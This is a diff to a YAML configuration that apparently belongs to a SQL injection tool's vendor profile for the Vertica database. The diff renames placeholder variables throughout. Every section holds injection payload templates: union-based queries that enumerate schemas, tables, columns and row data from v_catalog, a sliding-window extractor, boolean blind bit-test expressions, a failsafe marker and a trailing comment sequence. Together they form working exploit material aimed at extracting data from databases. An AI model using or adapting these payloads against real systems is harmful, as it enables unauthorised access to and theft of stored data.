@@ -2,95 +2,95 @@ vendor:
 resource: 
  info: |
   select
-      '${ENCLOSE_VALUE_SQL}'
+      '${enclose_value_sql}'
       || version()
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || current_database()
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || user
-      || '${TRAIL_SQL}'
+      || '${trail_sql}'
       
  schema: 
   database: |
    select 
        rr
-       ||'${TRAIL_SQL}'
+       ||'${trail_sql}'
        r
    from (
        select distinct
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || table_schema
-           || '${SEPARATOR_QTE_SQL}'
+           || '${separator_qte_sql}'
            || '0'
-           || '${ENCLOSE_VALUE_SQL}'
+           || '${enclose_value_sql}'
            rr
        from v_catalog.tables
        order by rr
-       {limit}
+       ${limit}
    )x
    
   table: |
    select 
        rr
-       ||'${TRAIL_SQL}'
+       ||'${trail_sql}'
        r
    from (
        select distinct
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || table_name
-           || '${SEPARATOR_QTE_SQL}'
+           || '${separator_qte_sql}'
            || '0'
-           || '${ENCLOSE_VALUE_SQL}'
+           || '${enclose_value_sql}'
            rr
        from v_catalog.tables
-       where TABLE_SCHEMA = '${DATABASE}'
+       where TABLE_SCHEMA = '${database}'
        order by rr
-       {limit}
+       ${limit}
    )x
    
   column: |
    select 
        rr
-       ||'${TRAIL_SQL}'
+       ||'${trail_sql}'
        r
    from (
        select distinct
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || column_name
-           || '${SEPARATOR_QTE_SQL}'
+           || '${separator_qte_sql}'
            || '0'
-           || '${ENCLOSE_VALUE_SQL}'
+           || '${enclose_value_sql}'
            rr
        from v_catalog.columns
-       where columns.TABLE_SCHEMA = '${DATABASE}'
-       and columns.TABLE_name = '${TABLE}'
+       where columns.TABLE_SCHEMA = '${database}'
+       and columns.TABLE_name = '${table}'
        order by rr
-       {limit}
+       ${limit}
    )x
    
   row: 
    query: |
     select 
         rr
-        ||'${TRAIL_SQL}'
+        ||'${trail_sql}'
         r
     from (
         select distinct
-            '${ENCLOSE_VALUE_SQL}'
-            || (${FIELDS})
-            || '${SEPARATOR_QTE_SQL}'
+            '${enclose_value_sql}'
+            || (${fields})
+            || '${separator_qte_sql}'
             || '0'
-            || '${ENCLOSE_VALUE_SQL}'
+            || '${enclose_value_sql}'
             rr
-        from ${DATABASE}.${TABLE}
+        from ${database}.${table}
         order by rr
-        {limit}
+        ${limit}
     )x
    fields: 
     field: |
      trim(
          coalesce(
-             ${FIELD}::varchar,
+             ${field}::varchar,
              ''
          )
      )
@@ -101,19 +101,19 @@ strategy:
   slidingWindow: |
    select
        /**
-        * If reach end of string (${LEAD}i) then NULLIF nullifies the result
+        * If reach end of string (${lead}i) then NULLIF nullifies the result
         */
-       '${LEAD}'
+       '${lead}'
        || NULLIF(
            substr(
-               (${INJECTION}),
-               ${INDEX},
+               (${injection}),
+               ${index},
                65536
            ),
-           '${TRAIL_SQL}'
+           '${trail_sql}'
        )
-  limit: limit 1 offset ${LIMIT}
-  failsafe: (1337${INDICE}7330%2b1)::varchar
+  limit: limit 1 offset ${limit.value}
+  failsafe: (1337${indice}7330%2b1)::varchar
   calibrator: repeat(chr(35), 1024)
   limitBoundary: 0
   endingComment: --+-
@@ -122,8 +122,8 @@ strategy:
     - Vertica Analytics
     
  normal: 
-  indices: union select ${INDICES}
-  capacity: (select '${LEAD}' || ${INDICE} || ${CALIBRATOR})
+  indices: union select ${indices}
+  capacity: (select '${lead}' || ${indice} || ${calibrator})
   orderBy: order by 1337
   
  boolean: 
@@ -151,13 +151,13 @@ strategy:
     0 != (
         ascii(
             substr(
-                (${INJECTION}),
-                ${INDEX},
+                (${injection}),
+                ${index},
                 1
             )
-        ) %26 ${BIT}
+        ) %26 ${bit}
     )
-   length: char_length((${INJECTION})) > ${INDEX}
+   length: char_length((${injection})) > ${index}
   modeAnd: and
   modeOr: or
-  blind: ${BOOLEAN.MODE} ${TEST}
+  blind: ${boolean.mode} ${test}
